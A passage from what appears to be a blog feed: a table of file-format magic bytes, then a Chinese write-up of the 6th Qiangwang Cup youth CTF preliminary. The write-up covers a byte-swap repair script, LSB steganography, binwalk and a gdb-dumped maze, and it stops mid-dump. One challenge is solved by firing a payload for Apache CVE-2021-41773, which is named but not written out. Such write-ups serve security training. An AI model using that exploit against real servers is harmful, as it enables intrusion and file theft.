style="text-align:left">application/vnd.quark.quarkxpress</td><td style="text-align:left"><ul><li>qxd</li></ul></td><td style="text-align:left"><ul><li>00 00 49 49 58 50 52</li><li>00 00 4d 4d 58 50 52</li></ul></td></tr><tr><td style="text-align:left">application/x-font-ttf</td><td style="text-align:left"><ul><li>ttf</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 00</li></ul></td></tr><tr><td style="text-align:left">application/x-msmoney</td><td style="text-align:left"><ul><li>mny</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 4d 53 49 53 41 4d 20 44 61 74 61 62 61 73 65</li></ul></td></tr><tr><td style="text-align:left">application/x-msaccess</td><td style="text-align:left"><ul><li>mdb</li></ul></td><td style="text-align:left"><ul><li>00 01 00 00 53 74 61 6e 64 61 72 64 20 4a 65 74 20 44 42</li></ul></td></tr><tr><td style="text-align:left">video/x-fli</td><td style="text-align:left"><ul><li>fli</li></ul></td><td style="text-align:left"><ul><li>00 11</li></ul></td></tr><tr><td style="text-align:left">image/x-rgb</td><td style="text-align:left"><ul><li>rgb</li></ul></td><td style="text-align:left"><ul><li>01 da 01 01 00 03</li></ul></td></tr><tr><td style="text-align:left">application/xml-dtd</td><td style="text-align:left"><ul><li>dtd</li></ul></td><td style="text-align:left"><ul><li>07 64 74 32 64 64 74 64</li></ul></td></tr><tr><td style="text-align:left">image/x-pcx</td><td style="text-align:left"><ul><li>pcx</li></ul></td><td style="text-align:left"><ul><li>0a 02 01 01</li><li>0a 03 01 01</li><li>0a 05 01 01</li></ul></td></tr><tr><td style="text-align:left">application/msword</td><td style="text-align:left"><ul><li>doc</li><li>dot</li></ul></td><td style="text-align:left"><ul><li>0d 44 4f 43</li><li>cf 11 e0 a1 b1 1a e1 00</li><li>d0 cf 11 e0 a1 b1 1a e1</li><li>db a5 2d 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-works</td><td style="text-align:left"><ul><li>wks</li><li>wps</li></ul></td><td style="text-align:left"><ul><li>0e 57 4b 53</li><li>ff 00 02 00 04 04 05 54</li><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.nitf</td><td style="text-align:left"><ul><li>ntf</li></ul></td><td style="text-align:left"><ul><li>1a 00 00</li><li>30 31 4f 52 44 4e 41 4e</li><li>4e 49 54 46 30</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-notes</td><td style="text-align:left"><ul><li>nsf</li></ul></td><td style="text-align:left"><ul><li>1a 00 00 04 00 00</li><li>4e 45 53 4d 1a 01</li></ul></td></tr><tr><td style="text-align:left">application/x-freearc</td><td style="text-align:left"><ul><li>arc</li></ul></td><td style="text-align:left"><ul><li>1a 02</li><li>1a 03</li><li>1a 04</li><li>1a 08</li><li>1a 09</li><li>41 72 43 01</li></ul></td></tr><tr><td style="text-align:left">video/webm</td><td style="text-align:left"><ul><li>webm</li></ul></td><td style="text-align:left"><ul><li>1a 45 df a3</li></ul></td></tr><tr><td style="text-align:left">video/x-matroska</td><td style="text-align:left"><ul><li>mkv</li></ul></td><td style="text-align:left"><ul><li>1a 45 df a3 93 42 82 88</li></ul></td></tr><tr><td style="text-align:left">application/x-msdownload</td><td style="text-align:left"><ul><li>msi</li><li>com</li><li>dll</li><li>exe</li></ul></td><td style="text-align:left"><ul><li>23 20</li><li>d0 cf 11 e0 a1 b1 1a e1</li><li>4d 5a</li><li>e8</li><li>e9</li><li>eb</li></ul></td></tr><tr><td style="text-align:left">audio/silk</td><td style="text-align:left"><ul><li>sil</li></ul></td><td style="text-align:left"><ul><li>23 21 53 49 4c 4b 0a</li></ul></td></tr><tr><td style="text-align:left">application/postscript</td><td style="text-align:left"><ul><li>eps</li></ul></td><td style="text-align:left"><ul><li>25 21 50 53 2d 41 64 6f</li><li>c5 d0 d3 c6</li></ul></td></tr><tr><td style="text-align:left">application/pdf</td><td style="text-align:left"><ul><li>pdf</li></ul></td><td style="text-align:left"><ul><li>25 50 44 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.fdf</td><td style="text-align:left"><ul><li>fdf</li></ul></td><td style="text-align:left"><ul><li>25 50 44 46</li></ul></td></tr><tr><td style="text-align:left">application/mac-binhex40</td><td style="text-align:left"><ul><li>hqx</li></ul></td><td style="text-align:left"><ul><li>28 54 68 69 73 20 66 69</li></ul></td></tr><tr><td style="text-align:left">text/plain</td><td style="text-align:left"><ul><li>log</li></ul></td><td style="text-align:left"><ul><li>00 2a 2a 2a 20 20 49 6e 73</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rn-realmedia</td><td style="text-align:left"><ul><li>rm</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rn-realmedia-vbr</td><td style="text-align:left"><ul><li>rmvb</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46</li></ul></td></tr><tr><td style="text-align:left">audio/x-pn-realaudio</td><td style="text-align:left"><ul><li>ra</li><li>ram</li></ul></td><td style="text-align:left"><ul><li>2e 52 4d 46 00 00 00 12</li><li>2e 72 61 fd 00</li><li>72 74 73 70 3a 2f 2f</li></ul></td></tr><tr><td style="text-align:left">audio/basic</td><td style="text-align:left"><ul><li>au</li></ul></td><td style="text-align:left"><ul><li>2e 73 6e 64</li><li>64 6e 73 2e</li></ul></td></tr><tr><td style="text-align:left">application/vnd.epson.msf</td><td style="text-align:left"><ul><li>msf</li></ul></td><td style="text-align:left"><ul><li>2f 2f 20 3c 21 2d 2d 20 3c 6d 64 62 3a 6d 6f 72 6b 3a 7a</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-pki.seccat</td><td style="text-align:left"><ul><li>cat</li></ul></td><td style="text-align:left"><ul><li>30</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-asf</td><td style="text-align:left"><ul><li>asf</li><li>asx</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li><li>3c</li></ul></td></tr><tr><td style="text-align:left">audio/x-ms-wma</td><td style="text-align:left"><ul><li>wma</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-wmv</td><td style="text-align:left"><ul><li>wmv</li></ul></td><td style="text-align:left"><ul><li>30 26 b2 75 8e 66 cf 11</li></ul></td></tr><tr><td style="text-align:left">application/x-mswrite</td><td style="text-align:left"><ul><li>wri</li></ul></td><td style="text-align:left"><ul><li>31 be</li><li>32 be</li><li>be 00 00 00 ab</li></ul></td></tr><tr><td style="text-align:left">application/x-7z-compressed</td><td style="text-align:left"><ul><li>7z</li></ul></td><td style="text-align:left"><ul><li>37 7a bc af 27 1c</li></ul></td></tr><tr><td style="text-align:left">image/vnd.adobe.photoshop</td><td style="text-align:left"><ul><li>psd</li></ul></td><td style="text-align:left"><ul><li>38 42 50 53</li></ul></td></tr><tr><td style="text-align:left">application/xml</td><td style="text-align:left"><ul><li>xml</li></ul></td><td style="text-align:left"><ul><li>3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 22 31 2e 30 22 3f 3e</li></ul></td></tr><tr><td style="text-align:left">application/vnd.framemaker</td><td style="text-align:left"><ul><li>fm</li></ul></td><td style="text-align:left"><ul><li>3c 4d 61 6b 65 72 46 69</li></ul></td></tr><tr><td style="text-align:left">application/vnd.mif</td><td style="text-align:left"><ul><li>mif</li></ul></td><td style="text-align:left"><ul><li>3c 4d 61 6b 65 72 46 69</li><li>56 65 72 73 69 6f 6e 20</li></ul></td></tr><tr><td style="text-align:left">application/gpx+xml</td><td style="text-align:left"><ul><li>gpx</li></ul></td><td style="text-align:left"><ul><li>3c 67 70 78 20 76 65 72 73 69 6f 6e 3d 22 31 2e</li></ul></td></tr><tr><td style="text-align:left">application/winhlp</td><td style="text-align:left"><ul><li>hlp</li></ul></td><td style="text-align:left"><ul><li>3f 5f 03 00</li><li>4c 4e 02 00</li></ul></td></tr><tr><td style="text-align:left">image/vnd.dwg</td><td style="text-align:left"><ul><li>dwg</li></ul></td><td style="text-align:left"><ul><li>41 43 31 30</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-organizer</td><td style="text-align:left"><ul><li>org</li></ul></td><td style="text-align:left"><ul><li>41 4f 4c 56 4d 31 30 30</li></ul></td></tr><tr><td style="text-align:left">text/x-vcard</td><td style="text-align:left"><ul><li>vcf</li></ul></td><td style="text-align:left"><ul><li>42 45 47 49 4e 3a 56 43</li></ul></td></tr><tr><td style="text-align:left">application/octet-stream</td><td style="text-align:left"><ul><li>bin</li><li>dms</li><li>mar</li></ul></td><td style="text-align:left"><ul><li>42 4c 49 32 32 33</li><li>44 4d 53 21</li><li>4d 41 52 31 00</li><li>4d 41 52 43</li><li>4d 41 72 30 00</li></ul></td></tr><tr><td style="text-align:left">image/bmp</td><td style="text-align:left"><ul><li>bmp</li></ul></td><td style="text-align:left"><ul><li>42 4d</li></ul></td></tr><tr><td style="text-align:left">application/x-mobipocket-ebook</td><td style="text-align:left"><ul><li>prc</li></ul></td><td style="text-align:left"><ul><li>42 4f 4f 4b 4d 4f 42 49</li></ul></td></tr><tr><td style="text-align:left">application/x-bzip2</td><td style="text-align:left"><ul><li>bz2</li></ul></td><td style="text-align:left"><ul><li>42 5a 68</li></ul></td></tr><tr><td style="text-align:left">application/x-iso9660-image</td><td style="text-align:left"><ul><li>iso</li></ul></td><td style="text-align:left"><ul><li>43 44 30 30 31</li></ul></td></tr><tr><td style="text-align:left">application/mac-compactpro</td><td style="text-align:left"><ul><li>cpt</li></ul></td><td style="text-align:left"><ul><li>43 50 54 37 46 49 4c 45</li><li>43 50 54 46 49 4c 45</li></ul></td></tr><tr><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left"><ul><li>swf</li></ul></td><td style="text-align:left"><ul><li>43 57 53</li><li>46 57 53</li><li>5a 57 53</li></ul></td></tr><tr><td style="text-align:left">application/x-cdlink</td><td style="text-align:left"><ul><li>vcd</li></ul></td><td style="text-align:left"><ul><li>45 4e 54 52 59 56 43 44</li></ul></td></tr><tr><td style="text-align:left">image/vnd.ms-modi</td><td style="text-align:left"><ul><li>mdi</li></ul></td><td style="text-align:left"><ul><li>45 50</li></ul></td></tr><tr><td style="text-align:left">video/x-flv</td><td style="text-align:left"><ul><li>flv</li></ul></td><td style="text-align:left"><ul><li>46 4c 56</li></ul></td></tr><tr><td style="text-align:left">audio/x-aiff</td><td style="text-align:left"><ul><li>aiff</li></ul></td><td style="text-align:left"><ul><li>46 4f 52 4d 00</li></ul></td></tr><tr><td style="text-align:left">message/rfc822</td><td style="text-align:left"><ul><li>eml</li></ul></td><td style="text-align:left"><ul><li>46 72 6f 6d</li><li>52 65 74 75 72 6e 2d 50</li><li>58 2d</li></ul></td></tr><tr><td style="text-align:left">image/gif</td><td style="text-align:left"><ul><li>gif</li></ul></td><td style="text-align:left"><ul><li>47 49 46 38</li></ul></td></tr><tr><td style="text-align:left">image/tiff</td><td style="text-align:left"><ul><li>tif</li><li>tiff</li></ul></td><td style="text-align:left"><ul><li>49 20 49</li><li>49 49 2a 00</li><li>4d 4d 00 2a</li><li>4d 4d 00 2b</li></ul></td></tr><tr><td style="text-align:left">audio/mpeg</td><td style="text-align:left"><ul><li>mp3</li></ul></td><td style="text-align:left"><ul><li>49 44 33</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-cab-compressed</td><td style="text-align:left"><ul><li>cab</li></ul></td><td style="text-align:left"><ul><li>49 53 63 28</li><li>4d 53 43 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-htmlhelp</td><td style="text-align:left"><ul><li>chm</li></ul></td><td style="text-align:left"><ul><li>49 54 53 46</li></ul></td></tr><tr><td style="text-align:left">application/java-archive</td><td style="text-align:left"><ul><li>jar</li></ul></td><td style="text-align:left"><ul><li>4a 41 52 43 53 00</li><li>50 4b 03 04</li><li>50 4b 03 04 14 00 08 00</li><li>5f 27 a8 89</li></ul></td></tr><tr><td style="text-align:left">application/x-ms-shortcut</td><td style="text-align:left"><ul><li>lnk</li></ul></td><td style="text-align:left"><ul><li>4c 00 00 00 01 14 02 00</li></ul></td></tr><tr><td style="text-align:left">application/x-tgif</td><td style="text-align:left"><ul><li>obj</li></ul></td><td style="text-align:left"><ul><li>4c 01</li><li>80</li></ul></td></tr><tr><td style="text-align:left">application/vnd.palm</td><td style="text-align:left"><ul><li>pdb</li></ul></td><td style="text-align:left"><ul><li>4d 2d 57 20 50 6f 63 6b</li><li>4d 69 63 72 6f 73 6f 66 74 20 43 2f 43 2b 2b 20</li><li>73 6d 5f</li><li>73 7a 65 7a</li><li>ac ed 00 05 73 72 00 12</li></ul></td></tr><tr><td style="text-align:left">application/vnd.tcpdump.pcap</td><td style="text-align:left"><ul><li>dmp</li><li>cap</li></ul></td><td style="text-align:left"><ul><li>4d 44 4d 50 93 a7</li><li>50 41 47 45 44 55</li><li>52 54 53 53</li><li>58 43 50 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.smaf</td><td style="text-align:left"><ul><li>mmf</li></ul></td><td style="text-align:left"><ul><li>4d 4d 4d 44 00 00</li></ul></td></tr><tr><td style="text-align:left">audio/midi</td><td style="text-align:left"><ul><li>mid</li><li>midi</li><li>rmi</li></ul></td><td style="text-align:left"><ul><li>4d 54 68 64</li><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">application/vnd.rim.cod</td><td style="text-align:left"><ul><li>cod</li></ul></td><td style="text-align:left"><ul><li>4e 61 6d 65 3a 20</li></ul></td></tr><tr><td style="text-align:left">audio/ogg</td><td style="text-align:left"><ul><li>oga</li><li>ogg</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">video/ogg</td><td style="text-align:left"><ul><li>ogv</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">application/ogg</td><td style="text-align:left"><ul><li>ogx</li></ul></td><td style="text-align:left"><ul><li>4f 67 67 53 00 02 00 00</li></ul></td></tr><tr><td style="text-align:left">image/x-portable-graymap</td><td style="text-align:left"><ul><li>pgm</li></ul></td><td style="text-align:left"><ul><li>50 35 0a</li></ul></td></tr><tr><td style="text-align:left">application/zip</td><td style="text-align:left"><ul><li>zip</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04</li><li>50 4b 03 04 14 00 01 00</li><li>50 4b 05 06</li><li>50 4b 07 08</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.wordprocessingml.document</td><td style="text-align:left"><ul><li>docx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.presentationml.presentation</td><td style="text-align:left"><ul><li>pptx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</td><td style="text-align:left"><ul><li>xlsx</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04 14 00 06 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.google-earth.kmz</td><td style="text-align:left"><ul><li>kmz</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.kde.kword</td><td style="text-align:left"><ul><li>kwd</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.text</td><td style="text-align:left"><ul><li>odt</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.presentation</td><td style="text-align:left"><ul><li>odp</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.oasis.opendocument.text-template</td><td style="text-align:left"><ul><li>ott</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.calc</td><td style="text-align:left"><ul><li>sxc</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.draw</td><td style="text-align:left"><ul><li>sxd</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.impress</td><td style="text-align:left"><ul><li>sxi</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.sun.xml.writer</td><td style="text-align:left"><ul><li>sxw</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/x-msmetafile</td><td style="text-align:left"><ul><li>wmz</li><li>wmf</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li><li>d7 cd c6 9a</li></ul></td></tr><tr><td style="text-align:left">application/x-xpinstall</td><td style="text-align:left"><ul><li>xpi</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-xpsdocument</td><td style="text-align:left"><ul><li>xps</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04</li></ul></td></tr><tr><td style="text-align:left">application/epub+zip</td><td style="text-align:left"><ul><li>epub</li></ul></td><td style="text-align:left"><ul><li>50 4b 03 04 0a 00 02 00</li></ul></td></tr><tr><td style="text-align:left">image/x-cmx</td><td style="text-align:left"><ul><li>cmx</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">video/x-msvideo</td><td style="text-align:left"><ul><li>avi</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">audio/x-wav</td><td style="text-align:left"><ul><li>wav</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">image/webp</td><td style="text-align:left"><ul><li>webp</li></ul></td><td style="text-align:left"><ul><li>52 49 46 46</li></ul></td></tr><tr><td style="text-align:left">application/x-rar-compressed</td><td style="text-align:left"><ul><li>rar</li></ul></td><td style="text-align:left"><ul><li>52 61 72 21 1a 07 00</li></ul></td></tr><tr><td style="text-align:left">application/x-stuffit</td><td style="text-align:left"><ul><li>sit</li></ul></td><td style="text-align:left"><ul><li>53 49 54 21 00</li><li>53 74 75 66 66 49 74 20</li></ul></td></tr><tr><td style="text-align:left">application/vnd.yamaha.smaf-phrase</td><td style="text-align:left"><ul><li>spf</li></ul></td><td style="text-align:left"><ul><li>53 50 46 49 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-wordpro</td><td style="text-align:left"><ul><li>lwp</li></ul></td><td style="text-align:left"><ul><li>57 6f 72 64 50 72 6f</li></ul></td></tr><tr><td style="text-align:left">application/pls+xml</td><td style="text-align:left"><ul><li>pls</li></ul></td><td style="text-align:left"><ul><li>5b 70 6c 61 79 6c 69 73 74 5d</li></ul></td></tr><tr><td style="text-align:left">audio/x-caf</td><td style="text-align:left"><ul><li>caf</li></ul></td><td style="text-align:left"><ul><li>63 61 66 66</li></ul></td></tr><tr><td style="text-align:left">application/x-csh</td><td style="text-align:left"><ul><li>csh</li></ul></td><td style="text-align:left"><ul><li>63 75 73 68 00 00 00 02</li></ul></td></tr><tr><td style="text-align:left">application/pkcs10</td><td style="text-align:left"><ul><li>p10</li></ul></td><td style="text-align:left"><ul><li>64 00 00 00</li></ul></td></tr><tr><td style="text-align:left">audio/x-flac</td><td style="text-align:left"><ul><li>flac</li></ul></td><td style="text-align:left"><ul><li>66 4c 61 43 00 00 00 22</li></ul></td></tr><tr><td style="text-align:left">application/pkix-attr-cert</td><td style="text-align:left"><ul><li>ac</li></ul></td><td style="text-align:left"><ul><li>72 69 66 66</li></ul></td></tr><tr><td style="text-align:left">application/x-apple-diskimage</td><td style="text-align:left"><ul><li>dmg</li></ul></td><td style="text-align:left"><ul><li>78 01 73 0d 62 62 60</li></ul></td></tr><tr><td style="text-align:left">application/vnd.xara</td><td style="text-align:left"><ul><li>xar</li></ul></td><td style="text-align:left"><ul><li>78 61 72 21</li></ul></td></tr><tr><td style="text-align:left">application/rtf</td><td style="text-align:left"><ul><li>rtf</li></ul></td><td style="text-align:left"><ul><li>7b 5c 72 74 66 31</li></ul></td></tr><tr><td style="text-align:left">image/png</td><td style="text-align:left"><ul><li>png</li></ul></td><td style="text-align:left"><ul><li>89 50 4e 47 0d 0a 1a 0a</li></ul></td></tr><tr><td style="text-align:left">application/applixware</td><td style="text-align:left"><ul><li>aw</li></ul></td><td style="text-align:left"><ul><li>8a 01 09 00 00 00 e1 08</li></ul></td></tr><tr><td style="text-align:left">application/java-vm</td><td style="text-align:left"><ul><li>class</li></ul></td><td style="text-align:left"><ul><li>ca fe ba be</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left"><ul><li>pps</li><li>ppt</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.ms-excel</td><td style="text-align:left"><ul><li>xla</li><li>xls</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">audio/adpcm</td><td style="text-align:left"><ul><li>adp</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-approach</td><td style="text-align:left"><ul><li>apr</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/x-mspublisher</td><td style="text-align:left"><ul><li>pub</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/vnd.visio</td><td style="text-align:left"><ul><li>vsd</li></ul></td><td style="text-align:left"><ul><li>d0 cf 11 e0 a1 b1 1a e1</li></ul></td></tr><tr><td style="text-align:left">application/x-xz</td><td style="text-align:left"><ul><li>xz</li></ul></td><td style="text-align:left"><ul><li>fd 37 7a 58 5a 00</li></ul></td></tr><tr><td style="text-align:left">application/vnd.wordperfect</td><td style="text-align:left"><ul><li>wpd</li></ul></td><td style="text-align:left"><ul><li>ff 57 50 43</li></ul></td></tr><tr><td style="text-align:left">image/jpeg</td><td style="text-align:left"><ul><li>jpe</li><li>jpeg</li><li>jpg</li></ul></td><td style="text-align:left"><ul><li>ff d8 ff</li></ul></td></tr><tr><td style="text-align:left">audio/x-aac</td><td style="text-align:left"><ul><li>aac</li></ul></td><td style="text-align:left"><ul><li>ff f1</li><li>ff f9</li></ul></td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六届强网杯青少年杯</title>
    <link href="/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/"/>
    <url>/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1>战队信息</h1><p>战队名称：Rml<br>战队排名：5</p><h2 id="web">web</h2><h3 id="web1">web1</h3><p>CVE-2021-41773，payload直接打</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png0.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="misc">misc</h2><h3 id="misc1">misc1</h3><p>base64解密后得到一张图片，但是每两个字节被换了位置</p><p>修复脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>data=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    f1.write(data[i:i+<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>得到hint<code>密钥就是音乐的财富密码</code>，加上题目描述<code>你知道万能和弦是什么吗?</code>，得到<code>4536251</code></p><p>lsb解密得到flag</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png1.png" srcset="/img/loading.gif" lazyload alt=""></p><h3 id="misc3">misc3</h3><p>binwalk分理出一个压缩包</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png2.png" srcset="/img/loading.gif" lazyload alt=""></p><p>还是lsb解密，密码在图片结尾，<code>7his_1s_p4s5w0rd</code></p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png3.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png4.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="reverse">reverse</h2><h3 id="re2">re2</h3><p>通过gdb动态调试获取地图的全貌</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">0</span>层<br> <span class="hljs-attribute">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span 